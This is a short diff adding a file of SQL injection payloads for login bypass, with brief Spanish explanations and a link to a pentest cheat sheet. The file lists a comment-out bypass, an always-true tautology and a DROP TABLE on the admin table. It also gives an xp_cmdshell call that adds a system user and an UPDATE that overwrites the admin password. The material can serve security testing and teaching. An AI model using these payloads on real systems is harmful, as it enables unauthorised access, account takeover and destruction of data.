@@ -1,0 +1,15 @@
+admin' -- (Esto es para probar un comentario SQL que potencialmente anularía la parte de la consulta donde se verifica la contraseña).
+
+'; DROP TABLE admin; --
+Este es un intento de inyección SQL que podría borrar la tabla de administradores si la inyección fuera posible.
+
+' OR '1'='1' --
+Esto intenta lograr que la condición del WHERE siempre sea verdadera al usar una tautología.
+
+'; EXEC xp_cmdshell('net user test testpass /add') --
+En un sistema vulnerable, esto intentaría ejecutar un comando del sistema a través de la shell de SQL (esto depende del sistema y los permisos de la base de datos).
+
+'; UPDATE admin SET password = 'newpassword' WHERE name = 'admin'; --
+
+More:
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
